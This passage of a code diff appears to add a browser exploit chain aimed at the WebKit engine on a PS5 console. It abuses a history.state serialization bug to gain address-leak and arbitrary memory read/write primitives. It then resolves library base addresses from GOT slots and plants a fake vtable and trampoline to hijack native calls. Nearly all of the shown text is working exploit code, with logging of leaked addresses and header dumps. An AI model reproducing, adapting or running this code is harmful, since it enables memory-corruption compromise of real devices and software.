+        || targetHolder.q2 !== realCollator || targetHolder.q3 !== compareFn
+        || targetHolder.q4 !== holderGuardA || targetHolder.q5 !== holderGuardB
+        || typeof compareFn !== "function")
+        throw new Error("notify-holder-shape-failed");
+}
+
+function buildAndStoreGraph() {
+    referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
+    buildFakeHost();
+
+    mark("SSV-BUILD", `k=${K}-n=${DRAIN_COUNT}`);
+    fillerGraph = new Array(0xfffd);
+    let pos = 0;
+    const huge = 1n << 40n;
+    for (let b = 0; b < FILLER_BIGINTS; ++b)
+        fillerGraph[pos++] = huge + BigInt(b);
+    for (let o = 0; o < FILLER_OBJECTS; ++o)
+        fillerGraph[pos++] = {};
+
+    outerGraph = new Array(CONTROL_INDEX + 1);
+    outerGraph[0] = fillerGraph;
+    outerGraph[1] = referenceTarget;
+    outerGraph[2] = referenceTarget;
+    outerGraph[CONTROL_INDEX] = CONTROL_INT;
+    mark("SSV-BUILT", `duplicate-index=${DUPLICATE_INDEX}`);
+
+    mark("SSV-STORE-ENTER", `writer-ref=0x${(0x10000 - K).toString(16)}`);
+    history.replaceState(outerGraph, "");
+    mark("SSV-STORED", "fake-host-and-rop-holder-not-serialized");
+}
+
+function prepareAddrof() {
+    capturedWords = new Uint16Array(16);
+    getterCarrier = function getterCarrierFunction() { return 7; };
+
+    mark("ADDROF-PREP-BEGIN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
+    getterCarrier[0] = fakeHost;
+    for (let i = 1; i < CARRIER_SLOTS; i++)
+        getterCarrier[i] = 0;
+    getterCarrier[1] = targetHolder;
+    getterCarrier[2] = fakeHost;
+    getterCarrier[3] = targetHolder;
+    mark("ADDROF-CARRIER-DONE", "host-holder-host-holder");
+
+    preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
+    mark("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);
+
+    setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
+    setTimeout(beginComposition, COMPOSE_DELAY_MS);
+}
+
+function runAddrofCapture() {
+    try {
+        capturedString = symbolToString.call(preparedSymbolObject);
+        copiedLength = capturedString.length;
+        for (let i = 0; i < 16; i++)
+            capturedWords[i] = capturedString.charCodeAt(7 + i);
+        captureState = 1;
+    } catch (error) {
+        captureError = error;
+        captureState = -1;
+    }
+}
+
+function fillRawCellPointers(backing, pointer) {
+    pointerHigh = Math.floor(pointer / 0x100000000);
+    pointerLow = pointer - pointerHigh * 0x100000000;
+
+    if (!plausibleCell(pointer)
+        || pointerHigh < 0 || pointerHigh > 0xffff
+        || Math.floor(pointerLow) !== pointerLow
+        || pointerLow < 0 || pointerLow > 0xffffffff
+        || pointerLow + pointerHigh * 0x100000000 !== pointer)
+        throw new Error("invalid-low48-fake-address");
+
+    predecessorWords = new Uint32Array(backing);
+    for (let i = 0; i < predecessorWords.length; i += 2) {
+        predecessorWords[i] = pointerLow;
+        predecessorWords[i + 1] = pointerHigh;
+    }
+
+    const last = predecessorWords.length - 2;
+    if (predecessorWords[0] !== pointerLow
+        || predecessorWords[1] !== pointerHigh
+        || predecessorWords[last] !== pointerLow
+        || predecessorWords[last + 1] !== pointerHigh)
+        throw new Error("pointer-fill-verification-failed");
+}
+
+function clearPredecessor() {
+    if (predecessorWords !== null)
+        predecessorWords.fill(0);
+}
+
+let lapseCandidate = null;
+
+function loadHistoryCritical() {
+    let result = null;
+    let candidate = null;
+    let rwHeaderCaptured = false;
+    let rwVectorTouched = false;
+    try {
+        result = history.state;
+        compositionLength = result.length;
+
+        if (compositionLength !== EXPECTED_LENGTH) {
+            result[DUPLICATE_INDEX] = undefined;
+            result = null;
+            clearPredecessor();
+            retrySafe = true;
+            compositionState = 3;
+            return;
+        }
+
+        if (result[1] === result[DUPLICATE_INDEX]) {
+            result[DUPLICATE_INDEX] = undefined;
+            candidate = null;
+            result = null;
+            clearPredecessor();
+            retrySafe = true;
+            compositionState = 2;
+            return;
+        }
+
+        candidate = result[DUPLICATE_INDEX];
+        candidateEverReturned = true;
+        result[DUPLICATE_INDEX] = undefined;
+        result = null;
+
+        readBytes(rwHeader, candidate, CELL_BYTES);
+        rwHeaderCaptured = true;
+
+        const rwSID = uint32At(rwHeader, 0);
+        const rwHeaderHigh = uint32At(rwHeader, 4);
+        const rwButterfly = low48At(rwHeader, 8);
+        rwOriginalVector = low48At(rwHeader, 0x10);
+
+        const rwOffsetZero = allZero(rwHeader, 0x20, 0x28);
+        rwHeaderOK = rwSID >= 0x4000 && rwSID < 0x08000000
+            && (rwSID & 0xf) === 0
+            && rwHeader[4] === 0 && rwHeader[5] === 0x28
+            && rwHeader[6] === 0x08
+            && (rwHeader[7] === 0 || rwHeader[7] === 1)
+            && rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0
+            && rwButterfly > 0x100000000 && rwButterfly % 8 === 0
+            && rwHeader[0x16] === 0 && rwHeader[0x17] === 0
+            && rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0
+            && rwHeader[0x18] === 0 && rwHeader[0x19] === 1
+            && rwHeader[0x1a] === 0 && rwHeader[0x1b] === 0
+            && rwHeader[0x1c] === 0 && rwHeader[0x1d] === 0
+            && rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0
+            && rwOffsetZero && rwHeader[0x28] === 0x58;
+
+        if (!rwHeaderOK) {
+            zeroHeaderMiss = allZero(rwHeader, 0, CELL_BYTES);
+            retrySafe = zeroHeaderMiss && !rwVectorTouched
+                && !candidateMutationStarted;
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        scratchWords[0] = rwSID;
+        scratchWords[1] = (rwHeaderHigh - 0x00020000) >>> 0;
+        const upgradedHeader = scratchDouble[0];
+        const upgradedFinite = upgradedHeader === upgradedHeader
+            && upgradedHeader !== Infinity && upgradedHeader !== -Infinity;
+        if (!upgradedFinite) {
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+        candidateMutationStarted = true;
+        fakeHost.q0 = upgradedHeader;
+        if (fakeHost.q0 !== upgradedHeader) {
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        rwVectorTouched = true;
+        aimCarrier(candidate, targetAddress);
+
+        const holderRepeated = readTwiceMatches(holderHeader, rwView,
+            HOLDER_BYTES);
+        const holderSID = uint32At(holderHeader, 0);
+        const holderButterflyZero = allZero(holderHeader, 0x08, 0x10);
+        nativeTargetAddress = low48At(holderHeader, 0x10);
+        arenaViewAddress = low48At(holderHeader, 0x18);
+        realCollatorAddress = low48At(holderHeader, 0x20);
+        compareFnAddress = low48At(holderHeader, 0x28);
+        const holderGuardAAddress = low48At(holderHeader, 0x30);
+        const holderGuardBAddress = low48At(holderHeader, 0x38);
+        holderHeaderOK = holderRepeated
+            && holderSID >= 0x4000 && holderSID < 0x08000000
+            && (holderSID & 0xf) === 0 && targetAddress % 0x10 === 0
+            && holderHeader[4] === 0 && holderHeader[5] === 0x18
+            && holderHeader[6] === 0
+            && (holderHeader[7] === 0 || holderHeader[7] === 1)
+            && holderButterflyZero
+            && plausibleCell(nativeTargetAddress)
+            && plausibleCell(arenaViewAddress)
+            && plausibleCell(realCollatorAddress)
+            && plausibleCell(compareFnAddress)
+            && plausibleCell(holderGuardAAddress)
+            && plausibleCell(holderGuardBAddress)
+            && canonicalLow48(holderHeader, 0x10)
+            && canonicalLow48(holderHeader, 0x18)
+            && canonicalLow48(holderHeader, 0x20)
+            && canonicalLow48(holderHeader, 0x28)
+            && canonicalLow48(holderHeader, 0x30)
+            && canonicalLow48(holderHeader, 0x38)
+            && nativeTargetAddress !== arenaViewAddress
+            && nativeTargetAddress !== realCollatorAddress
+            && arenaViewAddress !== realCollatorAddress
+            && realCollatorAddress !== compareFnAddress
+            && holderGuardAAddress !== holderGuardBAddress;
+
+        if (!holderHeaderOK) {
+            restoreCarrier(candidate);
+            rwVectorTouched = false;
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        aimCarrier(candidate, nativeTargetAddress);
+        readBytes(targetHeader, rwView, FUNCTION_BYTES);
+
+        functionStructureID = uint32At(targetHeader, 0);
+        const functionButterfly = low48At(targetHeader, 0x08);
+        const functionScope = low48At(targetHeader, 0x10);
+        executableAddress = low48At(targetHeader, 0x18);
+        functionHeaderOK = functionStructureID >= 0x4000
+            && functionStructureID < 0x08000000
+            && (functionStructureID & 0xf) === 0
+            && nativeTargetAddress % 0x10 === 0
+            && targetHeader[4] === 0 && targetHeader[5] === 0x1a
+            && targetHeader[6] === 0x0e
+            && (targetHeader[7] === 0 || targetHeader[7] === 1)
+            && targetHeader[0x0e] === 0 && targetHeader[0x0f] === 0
+            && targetHeader[0x16] === 0 && targetHeader[0x17] === 0
+            && targetHeader[0x1e] === 0 && targetHeader[0x1f] === 0
+            && functionButterfly > 0x100000000
+            && functionButterfly <= 0xffffffffffff
+            && functionButterfly % 8 === 0
+            && functionScope > 0x100000000
+            && functionScope <= 0xffffffffffff
+            && functionScope % 8 === 0
+            && executableAddress > 0x100000000
+            && executableAddress <= 0xffffffffffff
+            && executableAddress % 0x10 === 0
+            && (executableAddress & 1) === 0;
+
+        if (!functionHeaderOK) {
+            restoreCarrier(candidate);
+            rwVectorTouched = false;
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        aimCarrier(candidate, executableAddress);
+        readBytes(targetHeader, rwView, NATIVE_EXECUTABLE_BYTES);
+
+        nativeExecutableStructureID = uint32At(targetHeader, 0);
+        nativeFunctionAddress = low48At(targetHeader, 0x28);
+        nativeConstructorAddress = low48At(targetHeader, 0x30);
+        // Base anchor = host-constructor (m_constructor), uniquely pinnable on
+        // every build. There are several candidate thunks; pick the one whose
+        // subtraction gives a page-aligned webkitBase in the user-module band.
+        webkitBase = NaN;
+        for (let ci = 0; ci < P_HOST_CTOR_LIST.length; ++ci) {
+            const wb = nativeConstructorAddress - P_HOST_CTOR_LIST[ci];
+            if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
+                webkitBase = wb;
+                HOST_CONSTRUCTOR_OFFSET = P_HOST_CTOR_LIST[ci];
+                break;
+            }
+        }
+        const constructorBase = webkitBase;
+        const codeDelta = nativeFunctionAddress > nativeConstructorAddress
+            ? nativeFunctionAddress - nativeConstructorAddress
+            : nativeConstructorAddress - nativeFunctionAddress;
+        webkitBaseOK = webkitBase >= 0x800000000
+            && webkitBase < 0x900000000
+            && webkitBase % 0x4000 === 0
+            && constructorBase === webkitBase
+            && nativeFunctionAddress >= webkitBase
+            && nativeFunctionAddress < webkitBase + WEBKIT_TEXT_SIZE
+            && nativeConstructorAddress >= webkitBase
+            && nativeConstructorAddress < webkitBase + WEBKIT_TEXT_SIZE;
+        nativeExecutableHeaderOK = nativeExecutableStructureID >= 0x4000
+            && nativeExecutableStructureID < 0x08000000
+            && (nativeExecutableStructureID & 0xf) === 0
+            && targetHeader[4] === 0 && targetHeader[5] === 0x08
+            && targetHeader[6] === 0
+            && (targetHeader[7] === 0 || targetHeader[7] === 1)
+            && targetHeader[0x2e] === 0 && targetHeader[0x2f] === 0
+            && targetHeader[0x36] === 0 && targetHeader[0x37] === 0
+            && nativeFunctionAddress >= 0x800000000
+            && nativeFunctionAddress < 0x900000000
+            && nativeConstructorAddress >= 0x800000000
+            && nativeConstructorAddress < 0x900000000
+            && nativeFunctionAddress !== nativeConstructorAddress
+            && codeDelta > 0 && codeDelta < WEBKIT_TEXT_SIZE
+            && webkitBaseOK;
+
+        if (!nativeExecutableHeaderOK) {
+            restoreCarrier(candidate);
+            rwVectorTouched = false;
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        aimCarrier(candidate, nativeTargetAddress);
+        const executableAddress2 = low48At(rwView, 0x18);
+        const functionType2 = rwView[5];
+
+        aimCarrier(candidate, executableAddress);
+        const nativeFunctionAddress2 = low48At(rwView, 0x28);
+        const nativeConstructorAddress2 = low48At(rwView, 0x30);
+        const nativeExecutableType2 = rwView[5];
+        pointersRepeated = executableAddress2 === executableAddress
+            && nativeFunctionAddress2 === nativeFunctionAddress
+            && nativeConstructorAddress2 === nativeConstructorAddress
+            && functionType2 === 0x1a && nativeExecutableType2 === 0x08;
+
+        // Port path: leak libkernel_web base directly from three resolved
+        // import GOT slots in libSceNKWebKit's RELRO (getpid, close, __error).
+        // Each slot holds libkernelBase + exportRVA; the three derived bases
+        // must agree. Replaces the fixed 11.60 import-window mechanism.
+        const getpidSlotAddress = webkitBase + P_GETPID_SLOT;
+        const closeSlotAddress = webkitBase + P_CLOSE_SLOT;
+        const errorSlotAddress = webkitBase + P_ERROR_SLOT;
+
+        aimCarrier(candidate, getpidSlotAddress);
+        getpidPointer = low48At(rwView, 0);
+        const getpidPointer2 = low48At(rwView, 0);
+        const getpidCanonical = rwView[6] === 0 && rwView[7] === 0;
+
+        aimCarrier(candidate, closeSlotAddress);
+        closePointer = low48At(rwView, 0);
+        const closePointer2 = low48At(rwView, 0);
+        const closeCanonical = rwView[6] === 0 && rwView[7] === 0;
+
+        aimCarrier(candidate, errorSlotAddress);
+        errorPointer = low48At(rwView, 0);
+        const errorPointer2 = low48At(rwView, 0);
+        const errorCanonical = rwView[6] === 0 && rwView[7] === 0;
+
+        gotReadAttempted = true;
+        gotWindowAddressesOK = getpidSlotAddress % 8 === 0
+            && closeSlotAddress % 8 === 0 && errorSlotAddress % 8 === 0;
+        gotWindowsRepeated = getpidPointer === getpidPointer2
+            && closePointer === closePointer2
+            && errorPointer === errorPointer2;
+        gotCanonicalOK = getpidCanonical && closeCanonical && errorCanonical
+            && plausibleCell(getpidPointer) && plausibleCell(closePointer)
+            && plausibleCell(errorPointer);
+        gotReadOK = pointersRepeated && gotReadAttempted
+            && gotWindowAddressesOK && gotWindowsRepeated && gotCanonicalOK;
+
+        // Requirements/libc cross-checks are not on the ported notify path; the
+        // three-way libkernel_web agreement is the base validation.
+        requirementsBaseOK = true;
+        libcBaseOK = true;
+
+        const getpidBase = getpidPointer - P_GETPID_EXP;
+        const closeBase = closePointer - P_CLOSE_EXP;
+        const errorBase = errorPointer - P_ERROR_EXP;
+        getpidStatus = 1;
+        closeStatus = 1;
+        errorStatus = 1;
+        kernelBase = getpidBase;
+        kernelResolvedCount = 3;
+        const kernelConsistent = getpidBase === closeBase
+            && getpidBase === errorBase;
+        kernelBaseOK = gotReadOK && kernelConsistent
+            && inPS5UserModuleBand(kernelBase)
+            && kernelBase % 0x4000 === 0 && kernelBase !== webkitBase;
+
+        notifyEntryAddress = kernelBase + NOTIFY_OFFSET;
+        notifyAddressOK = kernelBaseOK
+            && getpidStatus === 1
+            && notifyEntryAddress === kernelBase + NOTIFY_OFFSET
+            && notifyEntryAddress >= kernelBase
+            && notifyEntryAddress < kernelBase + KERNEL_TEXT_SIZE;
+
+        aimCarrier(candidate, arenaViewAddress);
+        const arenaHeaderRepeated = readTwiceMatches(arenaViewHeader, rwView,
+            ARENA_VIEW_BYTES);
+        const arenaSID = uint32At(arenaViewHeader, 0);
+        const arenaButterfly = low48At(arenaViewHeader, 0x08);
+        arenaBacking = low48At(arenaViewHeader, 0x10);
+        const arenaLength = low48At(arenaViewHeader, 0x18);
+        arenaViewHeaderOK = arenaHeaderRepeated && arenaSID === rwSID
+            && arenaViewAddress % 8 === 0
+            && arenaViewHeader[4] === 0 && arenaViewHeader[5] === 0x28
+            && arenaViewHeader[6] === 0x08
+            && (arenaViewHeader[7] === 0 || arenaViewHeader[7] === 1)
+            && plausibleCell(arenaButterfly)
+            && plausibleCell(arenaBacking) && arenaBacking % 0x10 === 0
+            && canonicalLow48(arenaViewHeader, 0x08)
+            && canonicalLow48(arenaViewHeader, 0x10)
+            && canonicalLow48(arenaViewHeader, 0x18)
+            && arenaLength === ARENA_BYTES
+            && allZero(arenaViewHeader, 0x20, 0x28)
+            && arenaViewHeader[0x28] === 0x58;
+
+        if (arenaViewHeaderOK) {
+            aimCarrier(candidate, arenaBacking + 0xf00);
+            arenaBackingRepeated = rwView[0] === 0x52 && rwView[1] === 0x4f
+                && rwView[2] === 0x50 && rwView[3] === 0x31
+                && rwView[0] === arenaView[0xf00]
+                && rwView[1] === arenaView[0xf01]
+                && rwView[2] === arenaView[0xf02]
+                && rwView[3] === arenaView[0xf03];
+        }
+
+        aimCarrier(candidate, realCollatorAddress);
+        const collatorRepeated = readTwiceMatches(collatorHeader, rwView,
+            COLLATOR_BYTES);
+        const collatorSID = uint32At(collatorHeader, 0);
+        const collatorBoundCompare = low48At(collatorHeader, 0x10);
+        const originalUCollator = low48At(collatorHeader, 0x18);
+        const localeImpl = low48At(collatorHeader, 0x20);
+        const collationImpl = low48At(collatorHeader, 0x28);
+        collatorHeaderOK = collatorRepeated
+            && collatorSID >= 0x4000 && collatorSID < 0x08000000
+            && (collatorSID & 0xf) === 0 && realCollatorAddress % 8 === 0
+            && collatorHeader[4] === 0 && collatorHeader[5] === 0x17
+            && (collatorHeader[7] === 0 || collatorHeader[7] === 1)
+            && allZero(collatorHeader, 0x08, 0x10)
+            && collatorBoundCompare === compareFnAddress
+            && plausibleAddress(originalUCollator)
+            && plausibleAddress(localeImpl) && plausibleAddress(collationImpl)
+            && canonicalLow48(collatorHeader, 0x10)
+            && canonicalLow48(collatorHeader, 0x18)
+            && canonicalLow48(collatorHeader, 0x20)
+            && canonicalLow48(collatorHeader, 0x28)
+            && collatorHeader[0x30] === 1
+            && collatorHeader[0x33] === 0;
+        for (let saveCollator = 0; saveCollator < collatorOriginal.length;
+            ++saveCollator)
+            collatorOriginal[saveCollator] = collatorHeader[0x18 + saveCollator];
+
+        aimCarrier(candidate, compareFnAddress);
+        const compareHeaderRepeated = readTwiceMatches(compareFnHeader, rwView,
+            BOUND_COMPARE_BYTES);
+        const compareSID = uint32At(compareFnHeader, 0);
+        compareFnHeaderOK = compareHeaderRepeated
+            && compareSID >= 0x4000 && compareSID < 0x08000000
+            && (compareSID & 0xf) === 0 && compareFnAddress % 8 === 0
+            && compareFnHeader[4] === 0 && compareFnHeader[5] === 0x1a
+            && compareFnHeader[6] === 0x0c
+            && (compareFnHeader[7] === 0 || compareFnHeader[7] === 1)
+            && typeof compareFn === "function";
+
+        naturalTrampolineAddress = kernelBase + NATURAL_TRAMPOLINE_OFFSET;
+        fakeUCollatorAddress = arenaBacking + FAKE_UCOLLATOR_OFFSET;
+        fakeVtableAddress = arenaBacking + FAKE_VTABLE_OFFSET;
+        arenaLayoutOK = arenaViewHeaderOK && arenaBackingRepeated
+            && kernelBaseOK && arenaBacking % 0x10 === 0
+            && fakeUCollatorAddress >= arenaBacking
+            && fakeUCollatorAddress + 0xe8 <= arenaBacking + ARENA_BYTES
+            && fakeVtableAddress >= arenaBacking
+            && fakeVtableAddress + 0x130 <= arenaBacking + ARENA_BYTES
+            && getpidStatus === 1
+            && notifyAddressOK
+            && notifyEntryAddress === kernelBase + NOTIFY_OFFSET
+            && notifyEntryAddress >= kernelBase
+            && notifyEntryAddress < kernelBase + KERNEL_TEXT_SIZE
+            && naturalTrampolineAddress >= kernelBase
+            && naturalTrampolineAddress < kernelBase + KERNEL_TEXT_SIZE;
+
+        if (arenaLayoutOK && holderHeaderOK && functionHeaderOK
+            && nativeExecutableHeaderOK && webkitBaseOK && pointersRepeated
+            && gotReadOK && requirementsBaseOK && libcBaseOK && kernelBaseOK
+            && collatorHeaderOK && compareFnHeaderOK) {
+            putLow48(arenaView, FAKE_UCOLLATOR_OFFSET + 0x00,
+                fakeVtableAddress);
+            for (let zeroRdi = 0; zeroRdi < 8; ++zeroRdi)
+                arenaView[FAKE_UCOLLATOR_OFFSET + 0x48 + zeroRdi] = 0;
+            for (let zeroRcx = 0; zeroRcx < 8; ++zeroRcx)
+                arenaView[FAKE_UCOLLATOR_OFFSET + 0x60 + zeroRcx] = 0;
+            putLow48(arenaView, FAKE_UCOLLATOR_OFFSET + 0xe0,
+                notifyEntryAddress);
+            putLow48(arenaView, FAKE_VTABLE_OFFSET + 0x128,
+                naturalTrampolineAddress);
+
+            arenaFilledOK = low48StoredExactly(arenaView,
+                    FAKE_UCOLLATOR_OFFSET + 0x00, fakeVtableAddress)
+                && allZero(arenaView, FAKE_UCOLLATOR_OFFSET + 0x48,
+                    FAKE_UCOLLATOR_OFFSET + 0x50)
+                && allZero(arenaView, FAKE_UCOLLATOR_OFFSET + 0x60,
+                    FAKE_UCOLLATOR_OFFSET + 0x68)
+                && low48StoredExactly(arenaView,
+                    FAKE_UCOLLATOR_OFFSET + 0xe0, notifyEntryAddress)
+                && low48StoredExactly(arenaView,
+                    FAKE_VTABLE_OFFSET + 0x128, naturalTrampolineAddress);
+        }
+
+        notifyReady = arenaFilledOK && collatorHeaderOK && compareFnHeaderOK
+            && getpidStatus === 1 && notificationRequestOK
+            && notifyAddressOK;
+        if (notifyReady) {
+            aimCarrier(candidate, realCollatorAddress + 0x18);
+            carrierArmedForCommit = sameBytes(rwView, collatorOriginal,
+                collatorOriginal.length);
+            notifyReady = notifyReady && carrierArmedForCommit;
+        }
+
+        if (!notifyReady) {
+            restoreCarrier(candidate);
+            rwVectorTouched = false;
+            targetView[0] = 0xa5;
+            rwMirror[0] = 0x3c;
+            restoreObserved = rwView[0] === 0x3c
+                && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
+        } else {
+            rwVectorTouched = false;
+            restoreObserved = rwMirror[0] === 0x3c
+                && targetView[0] === 0xa5;
+        }
+        // slopkit-lapse: keep the aliased cell alive for the runtime shim.
+        // The original null-out is preserved for the retry-failed path via
+        // the catch below.
+        if (notifyReady) {
+            lapseCandidate = candidate;
+        }
+        candidate = null;
+        clearPredecessor();
+        compositionState = 1;
+    } catch (error) {
+        retrySafe = candidate === null && result === null
+            && !rwHeaderCaptured && error?.name === "TypeError";
+        if (result !== null) {
+            try { result[DUPLICATE_INDEX] = undefined; } catch {}
+        }
+        if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
+            try { restoreCarrier(candidate); } catch {}
+        }
+        candidate = null;
+        result = null;
+        try { targetView[0] = 0xa5; } catch {}
+        try { rwMirror[0] = 0x3c; } catch {}
+        try { clearPredecessor(); } catch {}
+        compositionError = error;
+        compositionState = -1;
+    }
+}
+
+function reportComposition() {
+    if (compositionState < 0) {
+        mark(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW",
+            `${compositionError?.name}:`
+            + String(compositionError?.message).slice(0, 80));
+        mark("DONE-THROW", `predecessor-cleared=true-retry-safe=${retrySafe}`
+            + `-candidate-seen=${candidateEverReturned}`
+            + `-candidate-mutated=${candidateMutationStarted}`);
+        if (!retrySafe) {
+            try { sessionStorage.setItem(blockKey, "1"); } catch {}
+            failed();
+        }
+        if (retrySafe)
+            scheduleSafeRetry("placement-throw");
+        return;
+    }
+
+    if (compositionState === 2) {
+        mark("NORMAL-CLONE-MISS", "known-reference-returned=true");
+        mark("DONE-MISS", "predecessor-cleared=true-retry-safe=true"
+            + "-candidate-seen=false-candidate-mutated=false");
+        scheduleSafeRetry("normal-clone-miss");
+        return;
+    }
+
+    if (compositionState === 3) {
+        const mismatchTag = zeroHeaderMiss ? "ZERO-HEADER-MISS"
+            : (retrySafe ? "COMPOSITION-LENGTH-MISS" : "VALIDATION-MISMATCH");
+        mark(mismatchTag, `rw=${rwHeaderOK}`
+            + `-holder=${holderHeaderOK}`
+            + `-function=${functionHeaderOK}`
+            + `-native-executable=${nativeExecutableHeaderOK}`
+            + `-base=${webkitBaseOK}`
+            + `-repeat=${pointersRepeated}`
+            + `-retry-safe=${retrySafe}`
+            + `-candidate-seen=${candidateEverReturned}`
+            + `-candidate-mutated=${candidateMutationStarted}`
+            + `-zero-header-miss=${zeroHeaderMiss}`
+            + "-carrier-restored=true");
+        mark("RW-HEADER-HEX", dumpHex(rwHeader, CELL_BYTES));
+        mark("WALK-BYTES-HEX", dumpHex(targetHeader, NATIVE_EXECUTABLE_BYTES));
+        if (!retrySafe) {
+            try { sessionStorage.setItem(blockKey, "1"); } catch {}
+            failed();
+        }
+        if (retrySafe)
+            scheduleSafeRetry(zeroHeaderMiss
+                ? "zero-header-miss" : "composition-length-mismatch");
+        return;
+    }
+
+    if (compositionState === 0) {
+        mark("NO-RESULT", "critical-load-did-not-finish");
+        failed();
+        return;
+    }
+
+    mark("SSV-RETURNED-CLEARED", `length=${compositionLength}`
+        + "-predecessor-cleared=true");
+    mark("RW-CARRIER", `sid=${hex(uint32At(rwHeader, 0))}`
+        + `-vector=${hex(rwOriginalVector)}`
+        + `-length=0x100-mode=0x${rwHeader[0x28].toString(16)}`);
+    mark("HOLDER", `cell=${hex(targetAddress)}`
+        + `-header-pass=${holderHeaderOK}`);
+    mark("JSFUNCTION", `parseInt=${hex(nativeTargetAddress)}`
+        + `-sid=${hex(functionStructureID)}`
+        + `-executable=${hex(executableAddress)}`);
+    mark("NATIVE-EXECUTABLE", `P=${hex(executableAddress)}`
+        + `-sid=${hex(nativeExecutableStructureID)}`);
+    mark("NATIVE-CALL-TARGET", `parseInt=${hex(nativeFunctionAddress)}`
+        + `-constructor=${hex(nativeConstructorAddress)}`);
+    mark("WEBKIT-BASE", `${hex(webkitBase)}`
+        + `-parseInt-rva=${hex(PARSEINT_NATIVE_OFFSET)}`
+        + `-constructor-rva=${hex(HOST_CONSTRUCTOR_OFFSET)}`
+        + `-text-size=${hex(WEBKIT_TEXT_SIZE)}`);
+    mark("IMPORT-WINDOWS", `A=${hex(webkitBase + IMPORT_WINDOW_A_OFFSET)}`
+        + `+${hex(IMPORT_WINDOW_A_BYTES)}`
+        + `-B=${hex(webkitBase + IMPORT_WINDOW_B_OFFSET)}`
+        + `+${hex(IMPORT_WINDOW_B_BYTES)}`
+        + `-address-ok=${gotWindowAddressesOK}`
+        + `-read-twice=${gotWindowsRepeated}`
+        + `-canonical=${gotCanonicalOK}`);
+    mark("REQUIREMENTS-IMPORTS", `A=${hex(requirementsObjectA)}`
+        + `-B=${hex(requirementsObjectB)}`);
+    mark("REQUIREMENTS-BASE", `${hex(requirementsBase)}`
+        + `-paired=true-pass=${requirementsBaseOK}`);
+    mark("LIBC-IMPORTS-1", `cxa_finalize=${hex(cxaFinalizePointer)}`
+        + `:${importStatusName(cxaFinalizeStatus)}`
+        + `-strlen=${hex(strlenPointer)}:${importStatusName(strlenStatus)}`);
+    mark("LIBC-IMPORTS-2", `strerror=${hex(strerrorPointer)}`
+        + `:${importStatusName(strerrorStatus)}`
+        + `-memchr=${hex(memchrPointer)}:${importStatusName(memchrStatus)}`);
+    mark("LIBC-BASE", `${hex(libcBase)}-equations=${libcResolvedCount}`
+        + `-pass=${libcBaseOK}`);
+    mark("KERNEL-IMPORTS-1", `object=${hex(kernelObjectPointer)}`
+        + `-close=${hex(closePointer)}:${importStatusName(closeStatus)}`
+        + `-error=${hex(errorPointer)}:${importStatusName(errorStatus)}`);
+    mark("KERNEL-IMPORTS-2", `getpid=${hex(getpidPointer)}`
+        + `:${importStatusName(getpidStatus)}`
+        + `-pthread_getspecific=${hex(pthreadGetspecificPointer)}`
+        + `:${importStatusName(pthreadGetspecificStatus)}`);
+    mark("KERNEL-BASE", `${hex(kernelBase)}-equations=${kernelResolvedCount}`
+        + `-object-anchor=${kernelObjectBaseOK}-pass=${kernelBaseOK}`);
+    mark("ARENA-CELL", `view=${hex(arenaViewAddress)}`
+        + `-backing=${hex(arenaBacking)}`
+        + `-size=${hex(ARENA_BYTES)}`
+        + `-header-pass=${arenaViewHeaderOK}`
+        + `-sentinel-pass=${arenaBackingRepeated}`);
+    mark("COLLATOR", `cell=${hex(realCollatorAddress)}`
+        + `-m_collator=${hex(realCollatorAddress + 0x18)}`
+        + `-original=${hex(low48At(collatorHeader, 0x18))}`
+        + `-compare=${hex(compareFnAddress)}`
+        + `-search-prewarmed=${collatorHeaderOK}`);
+    mark("NOTIFY-ARENA", `B=${hex(fakeUCollatorAddress)}`
+        + `-V=${hex(fakeVtableAddress)}`
+        + `-virtual-slot=${hex(fakeVtableAddress + 0x128)}`);
+    mark("NOTIFY-TRAMPOLINE", `${hex(naturalTrampolineAddress)}`
+        + `-libkernel-rva=${hex(NATURAL_TRAMPOLINE_OFFSET)}`
+        + "-natural-rsp=true-bytes=488b8fe000000051488b4f60488b7f48c3");
+    mark("NOTIFY-TARGET", `${hex(notifyEntryAddress)}`
+        + `-libkernel-rva=${hex(NOTIFY_OFFSET)}`
+        + `-address-ok=${notifyAddressOK}`
+        + "-offline-verified-fw=11.60-xotext-not-read=true");
+    mark("NOTIFY-CONTEXT", "B+48-rdi=0-device"
+        + "-B+60-rcx=0-nonblocking-B+e0=notification-export"
+        + `-rsi=request-rdx=${hex(NOTIFICATION_REQUEST_SIZE)}`);
+    mark("NOTIFY-REQUEST", `size=${hex(NOTIFICATION_REQUEST_SIZE)}`
+        + `-message-offset=${hex(NOTIFICATION_MESSAGE_OFFSET)}`
+        + `-ascii=true-layout-pass=${notificationRequestOK}`
+        + `-prewarm-result=${notificationPrewarmResult}`);
+    mark("RW-HEADER-HEX", dumpHex(rwHeader, CELL_BYTES));
+    mark("NATIVE-EXECUTABLE-HEX",
+        dumpHex(targetHeader, NATIVE_EXECUTABLE_BYTES));
+    mark("IMPORT-WINDOW-A-HEX", dumpHex(importWindowA1, IMPORT_WINDOW_A_BYTES));
+    mark("IMPORT-WINDOW-B-HEX", dumpHex(importWindowB1, IMPORT_WINDOW_B_BYTES));
+
+    const leakPass = rwHeaderOK && holderHeaderOK && functionHeaderOK
+        && nativeExecutableHeaderOK && webkitBaseOK
+        && pointersRepeated && restoreObserved
+        && gotReadOK && requirementsBaseOK && libcBaseOK && kernelBaseOK
